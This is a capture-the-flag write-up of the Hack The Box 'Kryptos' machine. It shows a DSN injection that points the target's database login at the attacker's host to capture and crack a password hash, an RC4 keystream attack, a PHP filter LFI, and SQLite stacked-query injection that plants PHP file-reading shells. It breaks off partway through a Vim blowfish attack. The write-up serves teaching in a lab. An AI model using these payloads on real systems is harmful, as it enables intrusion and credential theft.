---
layout: single
title: Kryptos - Hack The Box
excerpt: "I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there's an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I'll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation."
date: 2019-09-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-kryptos/kryptos_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - crypto
  - sqli
  - php
  - vim
  - lfi
  - mysql
  - sqlite
  - injection
  - jail escape
---

![](/assets/images/htb-writeup-kryptos/kryptos_logo.png)

I loved the Kryptos machine from [Adamm](https://asimuntis.github.io/) and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there's an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I'll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.

### Nmap

Not much to see here, standard Linux box with SSH and Apache.

```
# nmap -sC -sV -p- kryptos.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 19:01 EDT
Nmap scan report for kryptos.htb (10.10.10.129)
Host is up (0.012s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 2c:b3:7e:10:fa:91:f3:6c:4a:cc:d7:f4:88:0f:08:90 (RSA)
|   256 0c:cd:47:2b:96:a2:50:5e:99:bf:bd:d0:de:05:5d:ed (ECDSA)
|_  256 e6:5a:cb:c8:dc:be:06:04:cf:db:3a:96:e7:5a:d5:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cryptor Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web - 1st part (login page)

The web page contains a simple login form with a username and password.

![](/assets/images/htb-writeup-kryptos/web.png)

I tried guessing a few credentials and always got a `Nope.` message:

![](/assets/images/htb-writeup-kryptos/nope.png)

I see that the POST request passes the username and passwords as well as a CSRF token and a `db` value.

![](/assets/images/htb-writeup-kryptos/post.png)

I ran gobuster and found a couple of interesting directories and files but I get a redirect to the login page everytime because I'm not logged in so I'll need to bypass the login page first. That `/dev` folder gives me a 403 error so it's probably only accessible locally or something.
```
# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -t 50 -u http://kryptos.htb
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/aes.php (Status: 200)
/cgi-bin/ (Status: 403)
/cgi-bin/.php (Status: 403)
/css (Status: 301)
/decrypt.php (Status: 302)
/dev (Status: 403)
/encrypt.php (Status: 302)
/index.php (Status: 200)
/logout.php (Status: 302)
/server-status (Status: 403)
/url.php (Status: 200)
```

Because this box is ranked `insane` difficulty, this is most likely not a login page that I can bypass with a simple SQL injection. After playing with some of the parameters with Burp I found that whenever I change the `db` parameter I get the following error message:

```
Connection: close
Content-Type: text/html; charset=UTF-8

PDOException code: 1044
```

That CSRF token is annoying and makes the process of trying different parameters a pain in the ass while using Burp. I made a quick script to automate getting the CSRF token and testing different payloads:

```python
#!/ust/bin/python

import readline
import requests
from bs4 import BeautifulSoup

headers = { "Cookie": "PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi" }

while True:
    cmd = raw_input("> ")
    r = requests.get("http://kryptos.htb", headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "token"})["value"]
    data = { "username": "user", "password": "pass", "db": cmd, "token": csrf, "login": ""}
    print data
    r = requests.post("http://kryptos.htb", data=data, headers=headers)
    print r.text
```

Sample output:

```
# python db.py
> invalid
{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'invalid', 'login': ''}
PDOException code: 1044
> test
{'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'test', 'login': ''}
PDOException code: 1044
```

According to the [PDO documentation](https://www.php.net/manual/en/intro.pdo.php):

> The PHP Data Objects (PDO) extension defines a lightweight, consistent interface for accessing databases in PHP. Each database driver that implements the PDO interface can expose database-specific features as regular extension functions.

The [PDO constructor](https://www.php.net/manual/en/pdo.construct.php) documentation shows a code example using PDO:

![](/assets/images/htb-writeup-kryptos/pdo_example.png)

The DSN string contains the database name which I can pass in the login request. This looks like a potential injection point. If we can control the DSN string then we can potentially redirect the database connection to another host instead of the target server.

To verify this I started a netcat listener on my Kali VM on port 3306 and injected the following string: `;dbname=cryptor;host=10.10.14.23;`

![](/assets/images/htb-writeup-kryptos/mysql_callback.png)

The MySQL server connects back to me so that means I can capture the challenge and response pairs and then crack them offline. Metasploit already has a module for that: `server/capture/mysql`

```
msf5 auxiliary(server/capture/mysql) > show options

Module options (auxiliary/server/capture/mysql):

   Name        Current Setting                           Required  Description
   ----        ---------------                           --------  -----------
   CAINPWFILE                                            no        The local filename to store the hashes in Cain&Abel format
   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge
   JOHNPWFILE  /root/htb/kryptos/mysqlpwd                no        The prefix to the local filename to store the hashes in JOHN format
   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     3306                                      yes       The local port to listen on.
   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response
   SSL         false                                     no        Negotiate SSL for incoming connections
   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)

msf5 auxiliary(server/capture/mysql) >
[+] 10.10.10.129:58670 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptor
```

The hash was saved to the following file:

```
# cat mysqlpwd_mysqlna
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

I'm able to crack the hash with hashcat: `krypt0n1te`

```
# john -w=/usr/share/wordlists/rockyou.txt mysqlpwd_mysqlna
Using default input encoding: UTF-8
Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
krypt0n1te       (dbuser)
```

I tried those credentials on the login page but as expected they don't work because they're the DB creds, not the actual user credentials in the database. Since I now control which database backend is used for authentication and I have the credentials, I can create a database on my own machine with a username/password that I control. This will allow me to pass the authentication and login in to the site.

First, I need to change the MySQL server configuration so the servers listens on all interface and not just localhost:

```
# cat /etc/mysql/mariadb.conf.d/50-server.cnf

# this is read by the standalone daemon and embedded servers
[server]

# this is only for the mysqld standalone daemon
[mysqld]

bind-address = 0.0.0.0
```

Next I created a database and guessed that the table name is `users` (we can see validate this anyways by checking the MySQL logs generated when the server connects to our database)

```
MariaDB [(none)]> create database cryptor;
Query OK, 1 row affected (0.00 sec)

MariaDB [(none)]> use cryptor;
Database changed

MariaDB [cryptor]> create table users (username varchar(255), password varchar(255));
Query OK, 0 rows affected (0.01 sec)

MariaDB [cryptor]> insert into users (username, password) values ('snowscan', 'yolo1234');
Query OK, 1 row affected (0.00 sec)

MariaDB [cryptor]> grant all privileges on cryptor.* to 'dbuser'@'%' identified by 'krypt0n1te';
Query OK, 0 rows affected (0.01 sec)

MariaDB [cryptor]> flush privileges;
Query OK, 0 rows affected (0.01 sec)
```

I set up the Match and Replace function in Burp so I don't need to fiddle with the Intercept every time:

![](/assets/images/htb-writeup-kryptos/burp_replace.png)

I still got a `Nope.` message when logging in but I noticed in the MySQL logs that the SQL query is using the MD5 value of the password instead of the plaintext password.

```
root@ragingunicorn:/var/log/mysql# tail -f *

33 Query SELECT username, password FROM users WHERE username='snowscan' AND password='5ba4e0731a6248ea222262e4a65a912b'
```

So I just modified the existing password entry with the MD5 value of `yolo1234`:

```
MariaDB [cryptor]> update users set password='5ba4e0731a6248ea222262e4a65a912b' where username='snowscan';
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

And now I can log in successfully:

![](/assets/images/htb-writeup-kryptos/encryptor.png)

### Web - 2nd part (crypto)

The web app encrypts files that are linked on the form with either `AES-CBC` or `RC4`. I don't get to pick the key so I assume this is hardcoded in the code which I don't have access to right now. I tried fuzzing the handler to use `file:///` or something like that and also tried to pick another cipher like `None` or `Null` but that didn't work.

I don't see any obvious way to exploit `AES-CBC` here but `RC4` is interesting because the key stream generated here is the same across all files we encrypt. To verify this I created three different files on my machine:

```
# echo AAAAAAAA > 1
# echo AAAAAAAAAAAAAAAA > 2
# echo AAAAAAAAAAAAAAAAAAAAAAAA > 3
```

When I encrypt the files, I can clearly see that the same key stream is used across all 3 files since the beginning of the ciphertext is the same:

![](/assets/images/htb-writeup-kryptos/rc4_1.png)

![](/assets/images/htb-writeup-kryptos/rc4_2.png)

![](/assets/images/htb-writeup-kryptos/rc4_3.png)

Here's the base64 encoded ciphertext of the 3 files:

```
GX+u3Xsraj9A
GX+u3Xsraj8L2vu3pnC2hfU=
GX+u3Xsraj8L2vu3pnC2hb52BXbRJNo4Vw==
```

The ciphertext is common across all three plaintexts so the encryption here is using a static key for generate the RC4 key stream. I can't recover the key used to initialize RC4 but I can recover the XOR key stream since I control the plaintext and I also have the ciphertext. I just need to generate a large file, encrypt it with the web application and XOR the ciphertext with the original plaintext to recover the key stream. Then I can use the key stream to decrypt the ciphertext of other files.

```
# python -c 'print "A" * 1000000' > plaintext
```

![](/assets/images/htb-writeup-kryptos/rc_4.png)

I saved the output to `ciphertext` on my machine, then used a script to XOR both plaintext and ciphertext and generate a key stream file.

```python
#!/ust/bin/python

import base64

def sxor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

with open('plaintext', 'rb') as f:
    p = f.read()

with open('ciphertext', 'rb') as f:
    c = base64.b64decode(f.read())

k = sxor(p, c)

with open('keystream', 'wb') as f:
    f.write(k)
```

After generating the key stream, I wrote another script that issues request on the file encryptor and decrypts the output with the keystream file I generated.

```python
#!/usr/bin/python

from bs4 import BeautifulSoup

import base64
import requests
import readline
import sys

headers = { "Cookie": "PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"}

def sxor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

if len(sys.argv) != 2:
    print "Usage: decrypthttp.py <url>"
    sys.exit(-1)

with open("keystream", "rb") as f:
    k = f.read()

r = requests.get("http://kryptos.htb/encrypt.php?cipher=RC4&url=%s" % sys.argv[1], headers=headers)
soup = BeautifulSoup(r.text, "html.parser")
result_b64 = soup.find("textarea").string
if result_b64:
    c = base64.b64decode(result_b64)
    p = sxor(c, k)
    print p
else:
    print "** Nothing returned **"
```

The next step of the operation here is to exploit the file encryptor to read local files. By using the file encryptor I'm able to query that `/dev/` directory which I had found earlier but that gave me a 403 forbidden message.

```
# python decrypthttp.py http://127.0.0.1/dev/
<html>
    <head>
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=about">About</a>
	    <a href="index.php?view=todo">ToDo</a>
	</div>
</body>
</html>
```

Fetching the two pages shown above:

```
# python decrypthttp.py http://127.0.0.1/dev/index.php?view=about
    <html>
    <head>
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=about">About</a>
	    <a href="index.php?view=todo">ToDo</a>
	</div>
This is about page
</body>
</html>

# python decrypthttp.py http://127.0.0.1/dev/index.php?view=todo
<html>
    <head>
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=about">About</a>
	    <a href="index.php?view=todo">ToDo</a>
	</div>
<h3>ToDo List:</h3>
1) Remove sqlite_test_page.php
<br>2) Remove world writable folder which was used for sqlite testing
<br>3) Do the needful
<h3> Done: </h3>
1) Restrict access to /dev
<br>2) Disable dangerous PHP functions

</body>
</html>
```

The next target seems to be `sqlite_test_page.php` but the page doesn't seem to return much:

```
# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php
<html>
<head></head>
<body>
</body>
</html>
```

It's probably expecting some parameter either in a GET or POST request but I don't know what the parameter name is. The `index.php` page uses the `view` parameter to display the other pages by including the parameter name concatenated with the `.php` extension. I can confirm this below by browsing to `about.php` directly.

```
# python decrypthttp.py http://127.0.0.1/dev/about.php
This is about page
```

This `view` parameter is probably a good target for an LFI but at first glance I wasn't able to get anywhere when I tried the obvious suspects like `../../../etc/passwd` because `.php` is appended to the parameter:

```
# python decrypthttp.py http://127.0.0.1/dev/index.php?view=../../../../etc/passwd
<html>
    <head>
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=about">About</a>
	    <a href="index.php?view=todo">ToDo</a>
	</div>
</body>
</html>
```

So I used the PHP filter trick to read the `sqlite_test_page.php`. I'm using the base64 filter to encode and return the content of the file being included.

```
# python decrypthttp.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
<html>
    <head>
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Main Page</a>
	    <a href="index.php?view=about">About</a>
	    <a href="index.php?view=todo">ToDo</a>
	</div>
PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jlc3VsdHMnXTsKJGJvb2tpZCA9ICRfR0VUWydib29raWQnXTsKJHF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gYm9va3MgV0hFUkUgaWQ9Ii4kYm9va2lkOwppZiAoaXNzZXQoJGJvb2tpZCkpIHsKICAgY2xhc3MgTXlEQiBleHRlbmRzIFNRTGl0ZTMKICAgewogICAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpCiAgICAgIHsKCSAvLyBUaGlzIGZvbGRlciBpcyB3b3JsZCB3cml0YWJsZSAtIHRvIGJlIGFibGUgdG8gY3JlYXRlL21vZGlmeSBkYXRhYmFzZXMgZnJvbSBQSFAgY29kZQogICAgICAgICAkdGhpcy0+b3BlbignZDllMjhhZmNmMGIyNzRhNWUwNTQyYWJiNjdkYjA3ODQvYm9va3MuZGInKTsKICAgICAgfQogICB9CiAgICRkYiA9IG5ldyBNeURCKCk7CiAgIGlmKCEkZGIpewogICAgICBlY2hvICRkYi0+bGFzdEVycm9yTXNnKCk7CiAgIH0gZWxzZSB7CiAgICAgIGVjaG8gIk9wZW5lZCBkYXRhYmFzZSBzdWNjZXNzZnVsbHlcbiI7CiAgIH0KICAgZWNobyAiUXVlcnkgOiAiLiRxdWVyeS4iXG4iOwoKaWYgKGlzc2V0KCRub19yZXN1bHRzKSkgewogICAkcmV0ID0gJGRiLT5leGVjKCRxdWVyeSk7CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9Cn0KZWxzZQp7CiAgICRyZXQgPSAkZGItPnF1ZXJ5KCRxdWVyeSk7CiAgIHdoaWxlKCRyb3cgPSAkcmV0LT5mZXRjaEFycmF5KFNRTElURTNfQVNTT0MpICl7CiAgICAgIGVjaG8gIk5hbWUgPSAiLiAkcm93WyduYW1lJ10gLiAiXG4iOwogICB9CiAgIGlmKCRyZXQ9PUZBTFNFKQogICAgewoJZWNobyAiRXJyb3IgOiAiLiRkYi0+bGFzdEVycm9yTXNnKCk7CiAgICB9CiAgICRkYi0+Y2xvc2UoKTsKfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo=</body>
</html>
```

After decoding the base64, I got the source code for `sqlite_test_page.php`

```php
<html>
<head></head>
<body>
<?php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = "SELECT * FROM books WHERE id=".$bookid;
if (isset($bookid)) {
   class MyDB extends SQLite3
   {
      function __construct()
      {
	 // This folder is world writable - to be able to create/modify databases from PHP code
         $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
      }
   }
   $db = new MyDB();
   if(!$db){
      echo $db->lastErrorMsg();
   } else {
      echo "Opened database successfully\n";
   }
   echo "Query : ".$query."\n";

if (isset($no_results)) {
   $ret = $db->exec($query);
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
}
else
{
   $ret = $db->query($query);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ){
      echo "Name = ". $row['name'] . "\n";
   }
   if($ret==FALSE)
    {
	echo "Error : ".$db->lastErrorMsg();
    }
   $db->close();
}
}
?>
</body>
</html>
```

Based on the code above I see that:
- The `d9e28afcf0b274a5e0542abb67db0784` directory is world writable
- The GET parameters for this code are `no_results` and `bookid`
- The SQL query is clearly injectable as there is no sanitization done

I downloaded the entire .db file using the PHP filter LFI and it only contains a single table with two rows so there is nothing of value to extract using an SQL injection.

```
# sqlite3 books.db
SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
sqlite> .tables
books
sqlite> select * from books;
1|Serious Cryptography
2|Applied Cryptography

# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php?bookid=1
<html>
<head></head>
<body>
Opened database successfully
Query : SELECT * FROM books WHERE id=1
Name = Serious Cryptography
</body>
</html>
```

I tried a simple injection with `1 or 2` but it failed when I tried it:

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=1 or 2"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>
```

This is because I need to URL encode the value of the `bookid` parameter otherwise the query becomes invalid.

I modified the script to support a 2nd argument that contains extra data that needs to be URL encoded twice:

```python
#!/usr/bin/python

from bs4 import BeautifulSoup

import base64
import requests
import readline
import sys
import urllib

headers = { "Cookie": "PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"}
proxies = { "http": "http://127.0.0.1:8080" }

def sxor(s1,s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

payload = urllib.quote_plus(sys.argv[1])
extra = ""  # Extra payload to be double-encoded

if len(sys.argv) < 2:
    print "Usage: decrypthttp.py <url> <extra>"
    sys.exit(-1)
elif len(sys.argv) == 3:
    extra = urllib.quote_plus(urllib.quote_plus(sys.argv[2]))

with open("keystream", "rb") as f:
    k = f.read()

r = requests.get("http://kryptos.htb/encrypt.php?cipher=RC4&url=%s%s" % (payload, extra), headers=headers, proxies=proxies)
soup = BeautifulSoup(r.text, "html.parser")
result_b64 = soup.find("textarea").string
if result_b64:
    c = base64.b64decode(result_b64)
    p = sxor(c, k)
    print p
else:
    print "** Nothing returned **"
```

Testing the injection again, I can see that it works now since I get both book entries:

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=" "1 or 2"
<html>
<head></head>
<body>
Opened database successfully
Query : SELECT * FROM books WHERE id=1 or 2
Name = Serious Cryptography
Name = Applied Cryptography
</body>
</html>
```

Sqlite supports stacked queries so that allows me to write arbitrary files. I can create a new database in the `d9e28afcf0b274a5e0542abb67db0784` directory and write PHP data into a table. Then by issuing a GET to that file the PHP code should be reached and executed.

First, I tested writing a simple text file with no PHP code.

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');"
<html>
<head></head>
<body>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');
</body>
</html>

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.txt"
��.EtablepwnpwnCREATE TABLE pwn (yolo text)
  !Testing...
```

So this confirms that I can now write files to the target directory. Then I wrote a `phpinfo.php` to check the PHP configuration:

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php phpinfo(); ?>');"
<html>
<head></head>
<body>
Opened database successfully
Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php phpinfo(); ?>');
</body>
</html>
```

```
# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/phpinfo.php"
[...]
<tr><td class="e">System </td><td class="v">Linux kryptos 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:
33:07 UTC 2019 x86_64 </td></tr>
[...]
<tr><td class="e">disable_functions</td><td class="v">system,dl,passthru,exec,shell_exec,popen,escapeshe
llcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pc
ntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_si
gnal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwa
itinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</td><td cl
ass="v">system,dl,passthru,exec,shell_exec,popen,escapeshellcmd,escapeshellarg,pcntl_alarm,pcntl_fork,pc
ntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexit
status,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_g
et_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_get
priority,pcntl_setpriority,pcntl_async_signals,</td></tr>
```

I can't easily get a PHP shell since most of the "dangerous" functions are disabled. But I can read directories and files.

To scan directories:

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dir.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php var_dump(scandir(\$_GET[\"x\"])); ?>');"
```

I found the user directory and interesting files in it:

```
# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/"
��)[array(3) {nCREATE TABLE pwn (yolo text)
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(8) "rijndael"
}

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/rijndael"
��)[array(13) {CREATE TABLE pwn (yolo text)
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(13) ".bash_history"
  [3]=>
  string(12) ".bash_logout"
  [4]=>
  string(7) ".bashrc"
  [5]=>
  string(6) ".cache"
  [6]=>
  string(6) ".gnupg"
  [7]=>
  string(8) ".profile"
  [8]=>
  string(4) ".ssh"
  [9]=>
  string(9) "creds.old"
  [10]=>
  string(9) "creds.txt"
  [11]=>
  string(7) "kryptos"
  [12]=>
  string(8) "user.txt"
}
```

To read the files:

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/file.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php readfile(\$_GET[\"x\"]); ?>');"
```

```
# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/etc/passwd"
�� Iroot:x:0:0:root:/root:/bin/bashlo text)
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rijndael:x:1001:1001:,,,:/home/rijndael:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/user.txt"
�� ItablepwnpwnCREATE TABLE pwn (yolo text)

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.txt"
�� IVimCrypt~02!REATE TABLE pwn (yolo text)
�vnd]�K�yYC}�5�6gMRA�nD�@p;�-�

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.old"
�� Irijndael / Password1BLE pwn (yolo text)
```

Ok, so I can't read the `user.txt` file, I'll probably need to get a shell first.

The creds files are interesting but the binary output from the PHP script makes it hard to determine what is the content of the file being read versus the binary from the sqlite database. I'll just modify the script so it outputs the base64 content of file being read instead.

```
# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test30.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php echo(\"---\" . base64_encode(file_get_contents(\$_GET[\"x\"])) . \"---\"); ?>');"
```

```
# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.old"
��O�%---cmlqbmRhZWwgLyBQYXNzd29yZDEK---ext)

# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.txt"
��O�%---VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu---

# echo -ne "cmlqbmRhZWwgLyBQYXNzd29yZDEK" | base64 -d > creds.old
# echo -ne "VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu" | base64 -d > creds.txt

# cat creds.old
rijndael / Password1
# cat creds.txt
VimCrypt~02!
�vnd]�K�yYC}�5�6gMRA�n
```

The `creds.txt` file contains binary, running `file` on it I can see it's a Vim encrypted file:

```
# file creds.txt
creds.txt: Vim encrypted file data
```

`VimCrypt~02!` means that the `blowfish` cipher is used to encrypt the file.

The [https://dgl.cx/2014/10/vim-blowfish](https://dgl.cx/2014/10/vim-blowfish) blog explains a vulnerability in the blowfish Vim implementation. The same IV is used for the first 8 block. Since the encrypted file is very small it means that the same IV is used for both files.

If we look at the encrypted file, we see that the ciphertext is :

![](/assets/images/htb-writeup-kryptos/creds.png)

```
930d a810 766e 645d c14b e21c 7959 437d
d935 fb36 674d 5241 8b6e
```

I can guess that the first part of both files is the same -> `rijndael` (known plaintext)

By XORing the first 8 bytes of both files I can recover the key stream then the plaintext:

